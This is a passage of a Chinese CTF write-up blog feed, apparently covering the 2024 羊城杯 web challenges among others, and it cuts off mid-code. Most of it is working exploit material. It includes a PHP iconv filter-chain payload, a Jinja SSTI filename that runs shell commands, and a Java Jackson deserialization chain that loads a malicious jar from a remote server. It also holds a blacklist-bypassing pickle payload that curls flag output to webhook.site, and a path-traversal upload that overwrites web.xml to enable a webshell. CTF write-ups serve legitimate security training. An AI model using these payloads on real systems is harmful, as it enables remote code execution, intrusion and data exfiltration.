M932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/var/www/html/index.php<br></code></pre></td></tr></table></figure><h4 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h4><p>将文件名重命名为 <code>&#123;&#123;lipsum.__globals__['os'].popen('cd .. && cat flag').read()&#125;&#125;</code></p><p>嵌入表单，修改参数为 tp_file,上传压缩包</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;form&#x27;</span>);<br>form.method = <span class="hljs-string">&#x27;POST&#x27;</span>;<br>form.action = <span class="hljs-string">&#x27;&#x27;</span>;<br>form.enctype = <span class="hljs-string">&#x27;multipart/form-data&#x27;</span>;<br><br><span class="hljs-keyword">var</span> heading = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;h1&#x27;</span>);<br>heading.textContent = <span class="hljs-string">&#x27;File Upload&#x27;</span>;<br><br><span class="hljs-keyword">var</span> fileInput = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);<br>fileInput.type = <span class="hljs-string">&#x27;file&#x27;</span>;<br>fileInput.name = <span class="hljs-string">&#x27;file&#x27;</span>;<br><br><span class="hljs-keyword">var</span> submitInput = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);<br>submitInput.type = <span class="hljs-string">&#x27;submit&#x27;</span>;<br>submitInput.value = <span class="hljs-string">&#x27;Submit&#x27;</span>;<br><br><span class="hljs-keyword">var</span> p1 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;p&#x27;</span>);<br>p1.appendChild(fileInput);<br><br><span class="hljs-keyword">var</span> p2 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;p&#x27;</span>);<br>p2.appendChild(submitInput);<br><br>form.appendChild(heading);<br>form.appendChild(p1);<br>form.appendChild(p2);<br><br><span class="hljs-built_in">document</span>.body.appendChild(form);<br><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/26/DMliOpg5zBwn8PX.png" alt="image.png"></p><p><img src="https://s2.loli.net/2024/08/26/hVAZdEjLUkby6z4.png" alt="image.png"></p><p>flag被渲染到文件名部分<br><img src="https://s2.loli.net/2024/08/26/tSA2Lpmyjq5HEVB.png" alt="image.png"></p><h4 id="蹦蹦炸弹"><a href="#蹦蹦炸弹" class="headerlink" title="蹦蹦炸弹"></a>蹦蹦炸弹</h4><p>先jwt伪造成admin，进入admin页面：</p><p><img src="https://s2.loli.net/2024/08/26/OSc6qjMoRl9nz5L.png" alt="image.png"></p><p>之后文件上传的时候目录穿越，将文件上传至当前目录：<br><img src="https://s2.loli.net/2024/08/26/61xmyVTMgqD3pXN.png"></p><p>直接弹shell<br><img src="https://s2.loli.net/2024/08/26/IuJMeXhASvGFk2o.png" alt="image.png"></p><p>修改start.sh文件，改成转发shell,连接8888端口启动服务，获取root权限，直接读文件，坑点是flag文件名后面有个不可见字符<br><img src="https://s2.loli.net/2024/08/26/ouX5MsOYL9TCP1f.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024羊城杯WP</title>
    <link href="/blog/wp/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/"/>
    <url>/blog/wp/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/</url>
    
    <content type="html"><![CDATA[<h1 id="2024羊城杯WP"><a href="#2024羊城杯WP" class="headerlink" title="2024羊城杯WP"></a>2024羊城杯WP</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h3><p>admin的账号密码在jar包中给了是 admin &#x2F; admin888  用这个账号登录后台，然后打反序列化调用User类的getter方法，将恶意jar包加载进去，这个题目出网所以可以直接加载vps上的jar包。这个jar包中放一个有getter方法的恶意类，第二次使用反序列化去调用这个恶意jar包中的恶意getter方法执行命令。</p><p>反序列化调用getter方法，用EventListenerList类调用jackson的toString方法，再从toString到题目环境中的Getter方法。</p><p>另外就是使用jar协议去绕过对http和file协议的限制。</p><p>构建一个恶意 jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin888&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gift;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getGift</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">gift</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.username;<br>        java.lang.Runtime.getRuntime().exec(<span class="hljs-built_in">this</span>.username);<br>        <span class="hljs-keyword">return</span> gift;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGift</span><span class="hljs-params">(String gift)</span> &#123;<br>        <span class="hljs-built_in">this</span>.gift = gift;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String username, String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>加载恶意jar包exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ycbjava;<br><br><span class="hljs-keyword">import</span> com.example.ycbjava.bean.User;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;jar:http://xxxxxxxxxx/test.jar!/&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">toStringClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) refl.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(toStringClass);<br>        refl.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] ser = refl.serialize(list);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Encoder().encode(ser).replaceAll(<span class="hljs-string">&quot;\r|\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加载好 jar 后再次触发反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ycbjava;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classloader</span> <span class="hljs-operator">=</span> (URLClassLoader)ClassLoader.getSystemClassLoader();<br>        Class&lt;?&gt; execClass = classloader.loadClass(<span class="hljs-string">&quot;org.example.exec&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xxxxxxxxxx&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> execClass.newInstance();<br>        refl.setFieldValue(exec,<span class="hljs-string">&quot;username&quot;</span>,cmd);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">toStringClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(exec);<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) refl.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(toStringClass);<br>        refl.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] ser = refl.serialize(list);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Encoder().encode(ser).replaceAll(<span class="hljs-string">&quot;\r|\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h3><p><code>/lyrics</code> 路由存在路径穿越</p><p><img src="https://s2.loli.net/2024/08/28/1be5zFBy72AdDgs.png" alt="image-20240828023907180"></p><p>我们可以通过 <code>/proc/self/cwd/app.py</code> 拿到源代码, 同时还有这些</p><ul><li><code>/proc/self/cwd/config/secret_key.py</code></li><li><code>/proc/self/cwd/cookie.py</code></li></ul><p><code>secret_code = &quot;EnjoyThePlayTime123456&quot;</code></p><p><strong>Pickle 反序列化</strong></p><p>可以看到一个脆弱的 <code>blacklist</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">blacklist</span> = [b<span class="hljs-string">&#x27;R&#x27;</span>, b<span class="hljs-string">&#x27;secret&#x27;</span>, b<span class="hljs-string">&#x27;eval&#x27;</span>, b<span class="hljs-string">&#x27;file&#x27;</span>, b<span class="hljs-string">&#x27;compile&#x27;</span>, b<span class="hljs-string">&#x27;open&#x27;</span>, b<span class="hljs-string">&#x27;os.popen&#x27;</span>]<br></code></pre></td></tr></table></figure><p>我们可以直接在网上搜一个不存在上面字符串的 pickle payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;/bin/bash -c &quot;curl https://webhook.site/46160581-8f60-4ea0-8493-8872ea571270`/readflag | base64`&quot;&#x27;\nios\nsystem\n.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>通过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">set_cookie(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;/bin/bash -c &quot;curl https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxx/`/readflag`&quot;&#x27;\nios\nsystem\n.&#x27;&#x27;&#x27;</span>, secret= <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span>)<br></code></pre></td></tr></table></figure><p>即可 RCE</p><h3 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h3><p>代码审计</p><p>账号: <code>admin</code>  密码 <code>admin888</code></p><p><img src="https://s2.loli.net/2024/08/28/OLywDoXBnvtb4xH.png" alt="image-20240828033341185"></p><p><code>upload</code> 路由存在路径穿越</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/myapp/upload?path=../../conf/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.155.126.78:39990<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNAJDsE29J61LXwA1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=C72FF724D6478E780EBFB2947EFF24EA<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1317<br><br><span class="language-xml">------WebKitFormBoundaryNAJDsE29J61LXwA1</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;web.xml&quot;</span><br><span class="language-xml">Content-Type: text/xml</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>development<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>reload<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>JSPPage<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/myapp/uploads/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></span><br><span class="language-xml">------WebKitFormBoundaryNAJDsE29J61LXwA1--</span><br></code></pre></td></tr></table></figure><p>再上传一个一句话木马，后缀为 <code>xml</code> 即可连接</p><h3 id="网络照相馆"><a href="#网络照相馆" class="headerlink" title="网络照相馆"></a>网络照相馆</h3><p><code>url.php</code>任意文件 curl 读, 参考 <code>ctfshow - 元旦水友赛 2024 - easy_include</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">file://localhost/proc/self/cwd/url.php<br></code></pre></td></tr></table></figure><p>可以读取文件</p><p><strong>url.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;sql.php&#x27;</span>;<br><br><span class="hljs-variable">$baseDir</span> = <span class="hljs-string">&quot;data/&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$parse</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;url错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$baseDir</span> .  <span class="hljs-title function_ invoke__">get_filename</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span> = <span class="hljs-title function_ invoke__">mysqli_prepare</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>))&#123;<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="hljs-variable">$stmt</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$url</span>, <span class="hljs-variable">$filename</span>);<br>            <span 